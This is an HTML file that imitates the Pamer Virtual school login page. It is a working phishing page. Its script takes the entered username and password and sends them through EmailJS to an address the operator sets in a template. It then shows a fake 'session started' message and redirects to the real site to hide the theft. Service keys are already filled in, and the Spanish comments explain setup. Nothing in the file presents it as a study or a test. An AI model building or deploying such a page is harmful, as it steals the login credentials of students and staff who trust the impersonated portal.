<!DOCTYPE html>
<!-- basado en Pamer Virtual.html original, adaptado para 2 preguntas y EmailJS -->
<html>
<head>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Pamer Virtual</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <link rel="shortcut icon" href="https://aula.pamer.edu.pe/pamervirtual/favicon.png">
    <link href="./Pamer Virtual_files/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="./Pamer Virtual_files/bootstrap.min.css" rel="stylesheet">
    <link href="./Pamer Virtual_files/jquery-ui.css" rel="stylesheet" type="text/css">
    <script src="./Pamer Virtual_files/jquery-2.1.4.js" type="text/javascript"></script>
    <script src="./Pamer Virtual_files/jquery-ui.js" type="text/javascript"></script>
    <script src="./Pamer Virtual_files/aes.js" type="text/javascript"></script>
    <script src="./Pamer Virtual_files/useindex.js" type="text/javascript"></script>

    <link href="./Pamer Virtual_files/css2" rel="stylesheet">
    <link rel="stylesheet" href="./Pamer Virtual_files/login.css">
    <style>
      /* Pequeño ajuste inline para que los campos textarea se vean correctos con las clases existentes */
      .login-form__input.multiline { min-height: 86px; resize: vertical; padding-top:14px; padding-bottom:14px; }
      /* Mantengo el resto del CSS externo intacto (login.css etc.) */
    </style>
<style>
  .pregunta-label {
    font-family: 'Roboto', sans-serif !important;
  }
</style>
	</head>
<body class="body-style3">

    <p class="login-text">aula.pamer</p>
    <div id="divChangeID" style="display: none;"></div>

    <!-- login-form: reutilizado pero adaptado -->
    <div class="login-form" run="">
        <div class="login-form__content">
            <h3 class="login-form__logo">
                <img src="./Pamer Virtual_files/logo-pamerv2.svg" width="150" alt="pamer">
            </h3>

            <!-- Mantengo la estructura: título, subtítulo -->
            <h2 class="login-form__title">Inicia sesión</h2>
            <p class="login-form__subtitle">Por favor, ingresa tu correo Pamer y contraseña, para poder identificarte.</p>

            <!-- === CAMPOS adaptados: Pregunta 1 / Pregunta 2 === -->
<div class="zabdiel-textfield inputBasic login-form__input-content-email">
    <input class="login-form__input login-form__input-email run" type="text" id="preg1" required>
<label class="login-form__label pregunta-label" for="preg1">Ingresa tu usuario</label>
    <div class="login-form__input-icon login-form__input-icon-email">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M21.1655 5H2.83465C2.37436 5 2 5.37219 2 5.82973V18.1703C2 18.6279 2.37436 19 2.83465 19H21.1655C21.6257 19 22 18.6279 22 18.1703V5.82973C22 5.37219 21.6257 5 21.1655 5ZM21.6212 5.62488L21.4342 5.41053C21.5157 5.46236 21.5808 5.5366 21.6212 5.62488ZM21.1655 5.33138C21.2466 5.33138 21.3222 5.35244 21.39 5.38659L12.7245 12.864C12.3115 13.2203 11.689 13.221 11.2757 12.864L2.61211 5.38552C2.67948 5.35199 2.75435 5.33138 2.83465 5.33138H21.1655Z" fill="#3D3C3C" stroke="#3D3C3C" stroke-width="0.5"></path>
        </svg>
    </div>
</div>

<div class="zabdiel-textfield inputBasic login-form__input-content-password">
    <input class="login-form__input login-form__input-password run" type="text" id="preg2" required>
    <label class="login-form__label pregunta-label" for="preg2">Ingresa tu contraseña</label>
    <div class="login-form__input-icon login-form__input-icon-password">
        <svg width="23" height="24" viewBox="0 0 23 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="0.734863" width="21.7591" height="24" fill="white"></rect>
            <path d="M6.12866 11.9009L4.70134 14C4.51357 14.2761 4.1584 14.3321 3.90804 14.125C3.65768 13.9179 3.60694 13.5261 3.79471 13.25L5.16281 11.238C4.34938 10.634 3.53761 9.91526 2.72811 9.08191C2.49933 8.84639 2.48696 8.4509 2.70049 8.19855C2.91402 7.94621 3.27259 7.93257 3.50137 8.16809C8.95008 13.7773 14.2787 13.7773 19.7274 8.16809C19.9562 7.93257 20.3147 7.94621 20.5283 8.19855C20.7418 8.4509 20.7294 8.84639 20.5006 9.08191C19.6911 9.91526 18.8794 10.634 18.0659 11.238L19.434 13.25C19.6218 13.5261 19.5711 13.9179 19.3207 14.125C19.0703 14.3321 18.7152 14.2761 18.5274 14L17.1001 11.9009C16.4803 12.2915 15.8598 12.6157 15.2387 12.8735L16.107 15.2679C16.2232 15.5884 16.0819 15.9521 15.7913 16.0803C15.5007 16.2085 15.171 16.0526 15.0548 15.7321L14.1566 13.2555C13.4984 13.4469 12.8397 13.564 12.181 13.6067V16.125C12.181 16.4702 11.9273 16.75 11.6144 16.75C11.3014 16.75 11.0477 16.4702 11.0477 16.125V13.6067C10.389 13.564 9.73037 13.4469 9.07215 13.2555L8.17399 15.7321C8.05777 16.0526 7.728 16.2085 7.43743 16.0803C7.14687 15.9521 7.00554 15.5884 7.12176 15.2679L7.99008 12.8735C7.36898 12.6157 6.74841 12.2915 6.12866 11.9009Z" fill="#3D3C3C"></path>
        </svg>
    </div>
</div>

            <!-- Recuperar contraseña: lo dejamos, pero sin funcionalidad -->
            <div class="login-form__recover-password">
                <p class="login-form__recover-password-link">¿Olvidaste tu contraseña?</p>
            </div>

            <!-- Botón (mismo id btnLogin para reutilizar cualquier JS anterior) -->
            <button id="btnLogin" class="login-form__button run">Ingresar</button>

            <!-- Loading / mensajes (reutilizo id y clases existentes) -->
            <div id="loadingUsu" style="text-align: center; display: none;">
                <img src="./Pamer Virtual_files/loading.gif" alt="loading">
            </div>

            <div class="login-form__error control-group error" id="areaError" style="display:none;">
                <label class="login-form__message-error control-label" id="message"></label>
            </div>

            <div class="login-form__copyright">
                <p class="login-form__copyright-text">©  2025 Pamer Virtual Todos los Derechos Reservados</p>
            </div>
        </div>
    </div>

    <!-- Modal (mantengo) -->
    <div id="ventanaModal-login" class="modal-login">
        <div class="contenido-modal-login">
           <img src="./Pamer Virtual_files/popup-usuario-desactivado.png">
        </div>
    </div>

    <!-- ===== EmailJS (coloca tus claves donde se indica) ===== -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        (function(){
            // --- RELLENA ESTOS VALORES con tus claves reales ---
            const EMAILJS_PUBLIC_KEY  = "FhjzcnzCPPK5tv8Yj";
            const EMAILJS_SERVICE_ID  = "service_kodxo8c";
            const EMAILJS_TEMPLATE_ID = "template_kpwuofu";
            // -----------------------------------------------------

            // Inicializa EmailJS si hay public key (si no, se deja para que no rompa)
            try {
                if (EMAILJS_PUBLIC_KEY && EMAILJS_PUBLIC_KEY.indexOf("PEGAR") === -1) {
                    emailjs.init(EMAILJS_PUBLIC_KEY);
                }
            } catch(e) {
                console.warn("EmailJS init error:", e);
            }

            // Elementos UI
            const btn = document.getElementById('btnLogin');
            const loading = document.getElementById('loadingUsu');
            const areaError = document.getElementById('areaError');
            const msgLabel = document.getElementById('message');

            function showError(text){
                areaError.style.display = 'block';
                msgLabel.innerText = text;
            }
            function hideError(){
                areaError.style.display = 'none';
                msgLabel.innerText = '';
            }

            btn.addEventListener('click', function(ev){
                ev.preventDefault();
                hideError();

                const p1 = (document.getElementById('preg1')||{value:''}).value.trim();
                const p2 = (document.getElementById('preg2')||{value:''}).value.trim();

                if(!p1 || !p2){
                    showError("Usuario y/o contraseña incorrectos.");
                    return;
                }

                // Si no hay claves, avisamos y no intentamos enviar
                if(EMAILJS_PUBLIC_KEY.indexOf("PEGAR")!==-1 || EMAILJS_SERVICE_ID.indexOf("PEGAR")!==-1 || EMAILJS_TEMPLATE_ID.indexOf("PEGAR")!==-1){
                    showError("EmailJS no está configurado. Pega PUBLIC_KEY, SERVICE_ID y TEMPLATE_ID en el código.");
                    return;
                }

                btn.style.display = 'none';
                loading.style.display = 'block';

                const templateParams = {
                    pregunta1: p1,
                    pregunta2: p2
                    // NO incluimos destinatario: el correo destino debe configurarse en la plantilla (Recipients) de EmailJS
                };

                emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
                    .then(function(response) {
    loading.style.display = 'none';
    msgLabel.innerText = "Sesión iniciada correctamente.";
    areaError.style.display = 'block';
    areaError.classList.remove('error');
    areaError.classList.add('success');

    // Después de 2 segundos redirige a tu blog
    setTimeout(function(){
        window.location.href = "https://aula.pamer.edu.pe/pamervirtual/users";
    }, 2000);                    }, function(error) {
                        // error: muestro mensaje exacto para debugging
                        loading.style.display = 'none';
                        btn.style.display = '';
                        console.error('EmailJS error:', error);
                        var errText = "❌ Error al enviar. Reportar por favor.";
                        // si EmailJS devuelve detalle, lo mostramos para ayudar al debug
                        if(error && error.text) errText += " (" + error.text + ")";
                        showError(errText);
                    });
            });
        })();
    </script>

    <script>
        function resize_style3(){
            let w = Number((1 - ($('body').height() / $('body').width())).toFixed(3));
            if(w < 0.400){$('body').addClass('body-style3');}else{$('body').removeClass('body-style3');}
        }
        window.addEventListener("load", (event) => {resize_style3()});
        window.addEventListener('resize', function(event){resize_style3();});
    </script>

</body>
</html>
